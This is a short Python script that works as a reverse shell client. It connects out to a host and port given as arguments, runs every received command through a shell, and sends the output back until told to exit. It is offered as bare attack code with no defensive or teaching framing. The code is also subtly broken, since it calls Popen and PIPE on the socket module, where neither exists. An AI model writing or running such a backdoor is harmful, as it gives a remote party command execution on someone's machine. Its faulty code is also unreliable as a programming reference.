#coding:utf-8
import socket, sys

host = str(sys.argv[1])
port = int(sys.argv[2])

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))
while True:
	command = str(conn.recv(1024))

	if command != "exit()":
		sh = socket.Popen(command, shell = True, stdout = socket.PIPE, stderr = socket.PIPE, stdin = socket.PIPE)
		out , err = sh.communicate()

		result = str(out) + str(err)
		length = str(len(result)).zfill(16)
		conn.send(length + result)
	else: break

conn.close()
